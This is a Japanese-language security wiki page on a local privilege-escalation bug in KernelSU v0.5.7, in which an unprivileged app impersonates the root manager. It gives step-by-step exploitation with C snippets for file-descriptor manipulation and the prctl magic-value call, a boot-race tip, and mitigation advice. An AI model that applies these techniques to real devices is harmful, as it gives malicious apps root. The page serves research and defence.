# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRootなどのRooting frameworksは、Android/Linux kernelにpatchまたはhookを適用し、権限のないuserspace manager appに特権機能を公開します。Magiskについては以下で個別に説明します。これはCVE-2024-48336が、このKernelSU syscall pathではなくmanager側のcode loadingに関係していたためです。<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

このページでは、公開研究（特にZimperiumによるKernelSU v0.5.7の分析）で明らかになったtechniquesと落とし穴を抽象化し、red teamとblue teamの双方がattack surface、exploitation primitive、堅牢なmitigationを理解できるようにします。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- KernelSU v0.5.7では、kernel hook上の`prctl`がuserspaceからmagic value、command ID、command固有のargumentsを受け取ります。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- callerはまず`CMD_BECOME_MANAGER`でmanager statusを要求します。Authorizationはcommandごとに異なり、`CMD_GRANT_ROOT`はmanager/allowlist stateを確認し、`CMD_ALLOW_SU`はmanager専用、`CMD_SET_SEPOLICY`はこのversionではroot専用です。<sup>[[2]](#references)[[11]](#references)</sup>
- その他のcommandsはversion/configurationを照会するか、framework eventsを報告します。<sup>[[2]](#references)</sup>
- どのappでもこのsyscall interfaceを呼び出せるため、manager authenticationの正確性が極めて重要です。<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handlerへ転送するMagic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspaceがprctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)を呼び出すと、KernelSUは以下を検証します。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- 指定されたpathは、caller UIDに対応するexpected prefix（例: /data/data/<pkg>または/data/user/<id>/<pkg>）で始まる必要があります。
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- pathはcaller UIDが所有している必要があります。
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- calling processのopen file descriptorsを、descriptor orderの昇順で走査します。
- 各regular fileについて、pathが`/data/app/`で始まり`/base.apk`で終わる場合、pathに指定されたdata-directory pathから導出したpackage substringが含まれていることを要求します。
- これらのpath checksを最初に通過したcandidateのsignatureを検証します。
- APK v2 signatureをparseし、official manager certificateに対して検証します。
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

すべてのchecksに通過すると、kernelはmanagerのUIDを一時的にcacheします。その後、manager-only commandsはそのUIDを受け入れますが、その他のcommandsは自身のUIDまたはallowlist checksを引き続き使用します。<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7は、signature resultをPackageManagerのinstalled package identityにbindしていません。`manager.c`ではpackage testがpath substring check（`strstr(cwd, pkg)`）のみであり、そのtestを通過した最初のcandidateがsignature-checkされます。したがってattackerは、正規のmanager APKを、attackerのpackage nameも含む`/data/app/` path下に配置し、最初に選択されるようにできます。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

このtrust-by-indirectionにより、権限のないappがmanagerのsigning keyを所有せずにmanagerをimpersonateできます。<sup>[[1]](#references)</sup>

Exploitedされる主なproperties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scanはdescriptor index順で実行され、package checkは検証済みのpackage-to-APK identity bindingではなく、path substring testです。
- open()は利用可能な最小のFDを返します。先に番号の小さいFDをcloseすることで、attackerはorderingを制御できます。
- bundled manager APKは、official manager signatureを維持したまま、attackerのpackage stringを含む`/data/app/`下のpathに配置できます。

---
## Attack preconditions

具体的なKernelSU v0.5.7 caseには以下が必要です。<sup>[[1]](#references)[[3]](#references)</sup>

- Deviceが、vulnerableなRooting framework（例: KernelSU v0.5.7）ですでにroot化されていること。
- attackerが、localで任意の権限のないcode（Android app process）を実行できること。
- v0.5.7 implementationでは、`current->real_parent`がUID 0でなければなりません（source commentではこれをzygote direct-child requirementと説明しています）。`manager.c`はその他のparentsをrejectします。<sup>[[3]](#references)</sup>
- real managerがまだauthenticatedされていないこと（例: reboot直後）。一部のframeworksは成功後にmanager UIDをcacheするため、raceに勝つ必要があります。<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps（d demo videoでは、公開されたproof of conceptの動作を確認できます）:<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) prefixとownership checksを満たすため、自分のapp data directoryへの有効なpathを構築する。
2) 正規のKernelSU Manager base.apkを、自分のpackage stringを含む`/data/app/`下のpathに配置し、自分自身のbase.apkより小さい番号のFDでopenする。
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)を呼び出してchecksを通過する。
4) `CMD_GRANT_ROOT`を使用し、その後persistent suのために`CMD_ALLOW_SU`を使用する。rootを取得した後、かつ対応している場合にのみ、root-onlyの`CMD_SET_SEPOLICY`を呼び出す。

Step 2（FD ordering）に関するPractical notes:<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlinksを辿って、自分の`/data/app/*/base.apk`に対応するprocessのFDを特定する。
- 小さいFD（例: stdin、fd 0）をcloseし、legitimate manager APKを先にopenしてfd 0（または自分のbase.apk fdより小さいindex）を占有させる。
- legitimate manager APKをappにbundleし、そのpathが`/data/app/`で始まり、`/base.apk`で終わり、自分のpackage stringを含むようにする。例えば、appの`lib` directory下のpathでこれらのchecksを満たせます。<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
正規の manager APK を指す、より小さい番号の FD を強制する:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
KernelSU v0.5.7 の `prctl` hook を介したManagerの認証：<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
成功後の privileged commands（例）:<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: 現在のプロセスを root に昇格
- CMD_ALLOW_SU: 永続的な su の allowlist に自身の package/UID を追加
- CMD_SET_SEPOLICY: root 取得後に SELinux policy を調整；KernelSU v0.5.7 はこの command で UID 0 を確認する。<sup>[[2]](#references)</sup>

Race/persistence tip:
- AndroidManifest（`RECEIVE_BOOT_COMPLETED`）に BOOT_COMPLETED receiver を登録し、reboot 後に開始して real manager より前に authentication を試行する。この permission は `ACTION_BOOT_COMPLETED` の受信を許可するが、それ自体が scheduling priority を保証するものではない。<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection と mitigation のガイダンス

framework developers 向け:
- authentication を arbitrary FDs ではなく caller の package/UID に bind する:
- UID から caller の package を解決し、FD を scan するのではなく、PackageManager 経由で installed package の signature と照合する。
- kernel-only の場合は、stable caller identity（task creds）を使用し、process FDs ではなく、init/userspace helper が管理する stable source of truth に対して検証する。
- identity として path-prefix checks を使用しない；caller によって trivially satisfiable である。
- channel 上で nonce-based challenge–response を使用し、boot 時または key events 発生時に cached manager identity を clear する。
- 可能な場合は、generic syscalls に overloading する代わりに binder-based authenticated IPC を検討する。

defenders/blue team 向け:
- rooting frameworks と manager processes の存在を検出する；kernel telemetry がある場合は、疑わしい magic constants（例: 0xDEADBEEF）を使用する prctl calls を monitor する。<sup>[[1]](#references)[[11]](#references)</sup>
- managed fleets では、untrusted packages からの boot receivers が boot 後すぐに privileged manager commands を試行する場合に block または alert する。
- devices を patched framework versions に update 済みであることを確認する；update 時に cached manager IDs を invalidate する。

attack の制限:<sup>[[1]](#references)[[2]](#references)</sup>
- vulnerable framework によってすでに rooted されている devices にのみ影響する。
- 通常、legitimate manager が authentication する前に reboot/race window が必要となる（一部の frameworks は reset まで manager UID を cache する）。

---
## frameworks 全体にわたる関連 notes

- Password-based auth（例: historical APatch/SKRoot builds）は、passwords が guessable/bruteforceable である場合、または validations に bug がある場合に weak になり得る。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth（例: KernelSU）は principle 上 stronger だが、FD scans を通じて選択された path-derived artefacts ではなく、actual caller に bind する必要がある。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 は、unverified GMS package から code を load していた pre-Canary 27007 builds に影響し、local app が user interaction なしに Magisk app 内で code を execute して root に escalate することを可能にした。<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – すべての Evil の Rooting: Mobile Device を compromise し得る Security Holes](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c の authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c の FD iteration、package check、signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c の APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS が system app であることの Verify](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h の command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
